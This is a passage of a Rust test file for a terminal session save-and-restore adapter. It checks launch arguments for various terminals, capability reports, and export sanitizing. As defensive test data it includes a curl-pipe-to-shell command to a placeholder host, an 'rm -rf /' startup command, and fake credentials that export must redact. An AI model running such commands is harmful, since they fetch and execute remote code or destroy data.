    let command = "curl https://example.invalid/x.sh | sh # unapproved-marker";
    let state = sessions_with_command(command, false);
    assert!(
        prepare_sessions(&state, None, |_| true)
            .iter()
            .all(|s| s.command.is_none())
    );
    let encoded = powershell_encoded_command(command);
    for (kind, os, steps) in all_plans(&state) {
        assert!(!steps.is_empty(), "{kind:?} on {os:?}");
        let dump = format!("{steps:?}");
        for needle in ["unapproved-marker", "example.invalid", &encoded] {
            assert!(
                !dump.contains(needle),
                "{kind:?} on {os:?} leaked {needle}: {dump}"
            );
        }
    }
}

#[test]
fn approved_commands_reach_terminals_that_support_them() {
    use TerminalKind as K;
    let command = "npm run dev # approved-marker";
    let state = sessions_with_command(command, true);
    let encoded = powershell_encoded_command(command);
    for (kind, os, steps) in all_plans(&state) {
        let dump = format!("{steps:?}");
        let found = dump.contains("approved-marker") || dump.contains(&encoded);
        let supported = !matches!(
            kind,
            None | Some(K::QTerminal | K::DeepinTerminal | K::Warp)
        );
        assert_eq!(found, supported, "{kind:?} on {os:?}: {dump}");
    }
}

// ---- Through the adapter --------------------------------------------------------------------

fn platform_for(os: OsKind) -> MockPlatform {
    let platform = MockPlatform::new();
    let mut info = platform.info();
    info.os = os;
    platform.set_info(info);
    platform
}

fn plan_entry(
    platform: &MockPlatform,
    entry: &ApplicationEntry,
) -> Result<Vec<LaunchStep>, String> {
    let info = platform.info();
    let ctx = LaunchContext {
        platform,
        info: &info,
    };
    TerminalAdapter::new().launch_plan(&ctx, entry)
}

#[test]
fn launch_plan_resolves_the_launcher_not_the_server() {
    let temp = tempfile::tempdir().unwrap();
    let dir = temp.path().to_path_buf();
    let mut entry = ApplicationEntry::new("gnome-terminal", "GNOME Terminal", "terminal");
    entry.launch.executable = Some("/usr/libexec/gnome-terminal-server".into());
    entry.launch.arguments = vec!["--hide-menubar".into()];
    entry.state = AppState::Terminal {
        sessions: vec![terminal_session(Some(dir.clone()), Some("Terminal"))],
    };

    let platform = platform_for(OsKind::Linux);
    platform.install("gnome-terminal", exe("/usr/bin/gnome-terminal"));
    let steps = plan_entry(&platform, &entry).unwrap();
    assert_eq!(steps.len(), 1);
    assert_eq!(steps[0].request.target, exe("/usr/bin/gnome-terminal"));
    assert_eq!(
        steps[0].request.args,
        vec![
            "--hide-menubar".to_string(),
            "--window".to_string(),
            format!("--working-directory={}", dir.display()),
        ]
    );

    // Not installed: rely on PATH (a clear launch error if it is really missing).
    let steps = plan_entry(&platform_for(OsKind::Linux), &entry).unwrap();
    assert_eq!(steps[0].request.target, exe("gnome-terminal"));
}

#[test]
fn launch_plan_per_platform_targets() {
    // Windows Terminal through its wt.exe alias.
    let platform = platform_for(OsKind::Windows);
    platform.install(
        "wt.exe",
        exe(r"C:\Users\u\AppData\Local\Microsoft\WindowsApps\wt.exe"),
    );
    let entry = ApplicationEntry::new("windows-terminal", "Windows Terminal", "terminal");
    let steps = plan_entry(&platform, &entry).unwrap();
    assert_eq!(
        steps[0].request.target,
        exe(r"C:\Users\u\AppData\Local\Microsoft\WindowsApps\wt.exe")
    );
    assert_eq!(args(&steps[0]), ["-w", "new", "new-tab"]);

    // Classic console without a captured shell: cmd.exe.
    let entry = ApplicationEntry::new("windows-console", "Windows Console", "terminal");
    let steps = plan_entry(&platform_for(OsKind::Windows), &entry).unwrap();
    assert!(matches!(
        &steps[0].request.target,
        LaunchTarget::Executable { path } if path.to_string_lossy().to_lowercase().ends_with("cmd.exe")
    ));

    // macOS Terminal through Launch Services, even without captured package info.
    let entry = ApplicationEntry::new("macos-terminal", "Terminal", "terminal");
    let steps = plan_entry(&platform_for(OsKind::Macos), &entry).unwrap();
    assert_eq!(steps[0].request.target, bundle("com.apple.Terminal"));

    // Flatpak terminals launch through their package.
    let mut entry = ApplicationEntry::new("ptyxis", "Ptyxis", "terminal");
    let flatpak = PackageInfo {
        kind: PackageKind::Flatpak,
        id: "org.gnome.Ptyxis".into(),
        path: None,
    };
    entry.launch.package = Some(flatpak.clone());
    let steps = plan_entry(&platform_for(OsKind::Linux), &entry).unwrap();
    assert_eq!(
        steps[0].request.target,
        LaunchTarget::Package { package: flatpak }
    );

    // A terminal Reframe does not know, without any configured program.
    let entry = ApplicationEntry::new("exe:mystery", "Mystery", "terminal");
    assert_eq!(
        plan_entry(&platform_for(OsKind::Linux), &entry).unwrap_err(),
        "No executable is configured for Mystery."
    );
}

#[test]
fn syntax_follows_the_program_actually_launched() {
    let temp = tempfile::tempdir().unwrap();
    let dir = temp.path().to_path_buf();
    // A kitty entry the user re-pointed at Alacritty: Alacritty's option, not kitty's.
    let mut entry = ApplicationEntry::new("kitty", "kitty", "terminal");
    entry.launch.executable = Some("/usr/bin/alacritty".into());
    entry.state = AppState::Terminal {
        sessions: vec![terminal_session(Some(dir.clone()), Some("w"))],
    };
    let steps = plan_entry(&platform_for(OsKind::Linux), &entry).unwrap();
    assert_eq!(steps[0].request.target, exe("/usr/bin/alacritty"));
    assert_eq!(
        steps[0].request.args,
        vec!["--working-directory".to_string(), dir.display().to_string()]
    );
    // An unknown terminal entry whose program is Konsole gets Konsole's options.
    let mut entry = ApplicationEntry::new("exe:konsole-wrapper", "Konsole", "terminal");
    entry.launch.executable = Some("/usr/bin/konsole".into());
    entry.state = AppState::Terminal {
        sessions: vec![terminal_session(Some(dir.clone()), Some("w"))],
    };
    let steps = plan_entry(&platform_for(OsKind::Linux), &entry).unwrap();
    assert_eq!(
        steps[0].request.args,
        vec!["--workdir".to_string(), dir.display().to_string()]
    );
}

#[test]
fn capture_then_restore_round_trip() {
    let temp = tempfile::tempdir().unwrap();
    let kept = temp.path().join("kept");
    std::fs::create_dir(&kept).unwrap();
    let gone = temp.path().join("gone");

    let mut kitty = p(100, 1, "kitty", &["kitty"], None);
    kitty.executable_path = Some("/usr/bin/kitty".into());
    let mut tab1 = p(101, 100, "bash", &["bash"], None);
    tab1.working_directory = Some(kept.clone());
    let mut tab2 = p(
        102,
        100,
        "zsh",
        &["zsh", "-c", "export TOKEN=x; exec zsh"],
        None,
    );
    tab2.working_directory = Some(gone.clone());
    let all = vec![kitty, tab1, tab2];
    let window = WindowInfo {
        id: WindowId::new("k"),
        pid: 100,
        title: "kept".into(),
        class_name: Some("kitty".into()),
        app_id_hint: None,
        bounds: Rect::new(0, 0, 900, 600),
        normal_bounds: None,
        state: WindowState::Normal,
        monitor_id: None,
        desktop: None,
        is_focused: true,
        z_order: 0,
    };
    let identity = AppIdentity {
        app_id: "kitty".into(),
        display_name: "kitty".into(),
    };
    let platform = platform_for(OsKind::Linux);
    let info = platform.info();
    let ctx = CaptureContext {
        platform: &platform,
        info: &info,
        browser_tab_capture: false,
    };
    let input = CaptureInput {
        identity: &identity,
        processes: vec![&all[0]],
        windows: vec![&window],
        all_processes: &all,
    };
    let adapter = TerminalAdapter::new();
    let out = adapter.capture(&ctx, &input);
    assert_eq!(
        out.launch.executable.as_deref(),
        Some(Path::new("/usr/bin/kitty"))
    );
    assert!(!format!("{out:?}").contains("TOKEN"));

    let mut entry = ApplicationEntry::new("kitty", "kitty", "terminal");
    entry.launch = out.launch;
    entry.state = out.state;
    let steps = plan_entry(&platform, &entry).unwrap();
    // kitty cannot open tabs from the command line: one window per session; the missing
    // folder falls back to kitty's default folder.
    assert_eq!(steps.len(), 2);
    assert_eq!(
        steps[0].request.args,
        vec!["--directory".to_string(), kept.display().to_string()]
    );
    assert!(steps[1].request.args.is_empty());
    assert_eq!(steps[0].title_hint.as_deref(), Some("kept"));
}

#[test]
fn identifies_terminals_through_the_registry() {
    let registry = AdapterRegistry::builtin();
    let mut process = p(100, 1, "alacritty", &["alacritty"], None);
    process.executable_path = Some("/usr/bin/alacritty".into());
    let (adapter, identity) = registry.identify(&process, &[]);
    assert_eq!(adapter.id(), "terminal");
    assert_eq!(identity.app_id, "alacritty");
    assert_eq!(identity.display_name, "Alacritty");
    assert_eq!(registry.get("terminal").id(), "terminal");

    let other = p(200, 1, "gimp", &["gimp"], None);
    let (adapter, _) = registry.identify(&other, &[]);
    assert_ne!(adapter.id(), "terminal");
}

#[test]
fn capability_reports_partial_support_honestly() {
    let adapter = TerminalAdapter::new();
    let mut info = platform_for(OsKind::Linux).info();
    let capability = adapter.capability(&info);
    assert_eq!(capability.level, CapabilityLevel::Partial);
    let feature = |cap: &crate::model::AdapterCapability, name: &str| {
        cap.features
            .iter()
            .find(|f| f.name == name)
            .cloned()
            .unwrap_or_else(|| panic!("missing feature {name}"))
    };
    assert!(feature(&capability, "Reopen terminal windows").supported);
    assert!(feature(&capability, "Working directories").supported);
    assert!(feature(&capability, "Tabs").supported);
    assert!(feature(&capability, "Profiles").supported);
    let startup = feature(&capability, "Startup commands");
    assert!(startup.supported);
    assert_eq!(
        startup.note.as_deref(),
        Some("Only commands you add and approve")
    );
    let replay = feature(&capability, "Running programs, history and scrollback");
    assert!(!replay.supported);
    assert_eq!(replay.note.as_deref(), Some("Never replayed for safety"));

    info.os = OsKind::Macos;
    assert!(!feature(&adapter.capability(&info), "Tabs").supported);
    info.capabilities.process_details = Capability::unsupported("No /proc here.");
    let folders = feature(&adapter.capability(&info), "Working directories");
    assert!(!folders.supported);
    assert_eq!(folders.note.as_deref(), Some("No /proc here."));
    info.capabilities.process_details = Capability::partial("Sandboxed.");
    let folders = feature(&adapter.capability(&info), "Working directories");
    assert!(folders.supported);
    assert!(folders.note.unwrap().ends_with("Sandboxed."));
}

#[test]
fn describe_summarises_sessions_folders_and_commands() {
    let adapter = TerminalAdapter::new();
    let session = |dir: Option<&str>| terminal_session(dir.map(abs), None);
    let state = AppState::Terminal {
        sessions: vec![
            session(Some("code/api")),
            session(Some("code/web")),
            session(Some("other/api")),
            session(None),
        ],
    };
    let details = adapter.describe(&state);
    assert_eq!(details.len(), 2);
    assert_eq!(
        (details[0].label.as_str(), details[0].value.as_str()),
        ("Sessions", "4")
    );
    assert_eq!(
        (details[1].label.as_str(), details[1].value.as_str()),
        ("Folders", "api, web")
    );

    let state = AppState::Terminal {
        sessions: vec![
            TerminalSession {
                startup_command: Some("make".into()),
                startup_command_approved: true,
                ..session(Some("x"))
            },
            TerminalSession {
                startup_command: Some("rm -rf /".into()),
                ..session(Some("x"))
            },
        ],
    };
    let details = adapter.describe(&state);
    assert_eq!(
        (details[1].label.as_str(), details[1].value.as_str()),
        ("Folder", "x")
    );
    // The command text itself is never shown in the summary.
    assert_eq!(
        (details[2].label.as_str(), details[2].value.as_str()),
        ("Startup commands", "1 approved, 1 not approved")
    );

    let many = AppState::Terminal {
        sessions: (0..8)
            .map(|i| {
                let name = format!("d{i}");
                session(Some(name.as_str()))
            })
            .collect(),
    };
    assert_eq!(
        adapter.describe(&many)[1].value,
        "d0, d1, d2, d3, d4, and 3 more"
    );
    assert!(adapter.describe(&AppState::None).is_empty());
}

#[test]
fn locate_query_instance_model_and_export_sanitizing() {
    let adapter = TerminalAdapter::new();
    let konsole = adapter.locate_query("konsole");
    assert!(konsole.display_names.contains(&"Konsole".to_string()));
    assert!(konsole.executable_names.iter().any(|n| n == "konsole"));
    let unknown = adapter.locate_query("exe:mystery");
    assert!(unknown.executable_names.iter().any(|n| n == "mystery"));
    assert_eq!(adapter.instance_model(), InstanceModel::SingleInstance);

    let state = AppState::Terminal {
        sessions: vec![TerminalSession {
            startup_command: Some("npm start".into()),
            startup_command_approved: true,
            ..terminal_session(Some(abs("x")), Some("w"))
        }],
    };
    let AppState::Terminal { sessions } = adapter.sanitize_for_export(&state) else {
        panic!("state kind changed");
    };
    assert!(!sessions[0].startup_command_approved);
    assert_eq!(sessions[0].startup_command.as_deref(), Some("npm start"));
    assert_eq!(sessions[0].window_title.as_deref(), Some("w"));
}

#[test]
fn exports_leave_out_commands_and_titles_that_look_like_credentials() {
    let adapter = TerminalAdapter::new();
    let session = |command: &str, title: Option<&str>| TerminalSession {
        startup_command: Some(command.into()),
        startup_command_approved: true,
        ..terminal_session(Some(abs("x")), title)
    };
    let secret_commands = [
        "export GITHUB_TOKEN=ghp_abc && npm start",
        "mysql --password=hunter2 prod",
        "AWS_SECRET_ACCESS_KEY=x ./deploy",
        "psql postgres://admin:s3cret@db.internal/prod",
        "curl -H 'Authorization: Bearer abc' https://api",
        "API_KEY=1 make",
    ];
    let kept_commands = [
        "npm run dev",
        "ssh://git@github.com/org/repo",
        "git clone https://github.com/org/repo",
        "cargo watch -x test",
    ];
    let mut sessions: Vec<TerminalSession> = secret_commands
        .iter()
        .map(|c| session(c, Some("psql postgres://admin:s3cret@db/prod")))
        .collect();
    sessions.extend(kept_commands.iter().map(|c| session(c, None)));
    let AppState::Terminal { sessions } =
        adapter.sanitize_for_export(&AppState::Terminal { sessions })
    else {
        panic!("state kind changed");
    };
    let secrets = [
        "ghp_abc",
        "hunter2",
        "s3cret",
        "Bearer abc",
        "AWS_SECRET_ACCESS_KEY=x",
        "API_KEY=1",
    ];
    for (session, command) in sessions.iter().zip(secret_commands) {
        // Either dropped by this adapter or redacted by the shared export sanitizer; never
        // exported with the credential.
        if let Some(kept) = session.startup_command.as_deref() {
            assert!(
                !secrets.iter().any(|s| kept.contains(s)),
                "{command} exported as {kept}"
            );
        }
        // The window boundary survives; its revealing part does not (the shared export
        // sanitizer may already have removed the credential, leaving a harmless title).
        let title = session.window_title.as_deref().expect("window kept");
        assert!(!title.contains("s3cret"), "{command}: {title}");
    }
    for (session, command) in sessions[secret_commands.len()..].iter().zip(kept_commands) {
        assert_eq!(session.startup_command.as_deref(), Some(command));
    }
    assert!(sessions.iter().all(|s| !s.startup_command_approved));
    let exported = serde_json::to_string(&sessions).unwrap();
    for secret in ["hunter2", "s3cret", "ghp_abc", "Bearer"] {
        assert!(!exported.contains(secret), "{secret} exported: {exported}");
    }
}

#[test]
fn platform_info_round_trip_for_mock() {
    // Guard for the helpers above: overriding the OS keeps the rest of the platform report.
    let info: PlatformInfo = platform_for(OsKind::Windows).info();
    assert_eq!(info.os, OsKind::Windows);
    assert!(info.capabilities.process_details.is_available());
}
